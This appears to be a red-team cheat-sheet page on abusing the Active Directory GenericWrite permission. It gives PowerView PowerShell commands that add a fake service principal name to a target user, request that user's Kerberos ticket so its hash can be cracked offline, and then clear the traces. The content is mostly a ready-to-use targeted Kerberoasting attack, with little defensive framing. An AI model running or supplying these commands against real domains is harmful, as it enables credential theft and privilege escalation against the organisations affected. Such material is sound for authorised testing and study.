# GenericWrite



Upload PowerView.ps1 
[PowerView Tips by Harmj0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
[Harmj0y Cheatsheets](https://github.com/HarmJ0y/CheatSheets)

####  Over a User

GenericWrite - the [iredteam Generic requires log off and on](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('$domain\$user', $SecPassword)
```

Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as user:

```powershell
# The service principle name does not matter 
Set-DomainObject -Credential $Cred -Identity $currentUser -SET @{serviceprincipalname='DoesNot/MatterunlessOPSEC'}
```

After running this, you can use [Get-DomainSPNTicket](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/#get-domainspnticket) as follows:

```powershell
Get-DomainSPNTicket -Credential $Cred -SPN 'Object/maria'  | fl
```

The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:

```powershell
# Bloodhound errorious -TargetIdentity issues
Set-DomainObject -Credential $Cred -Identity maria -Clear serviceprincipalname
```

## References

[Bloodhound](https://bloodhound.readthedocs.io/en/latest/)
[PowerView Tips by Harmj0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
[Harmj0y Cheatsheets](https://github.com/HarmJ0y/CheatSheets)
[iredteam Generic requires log off and on](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
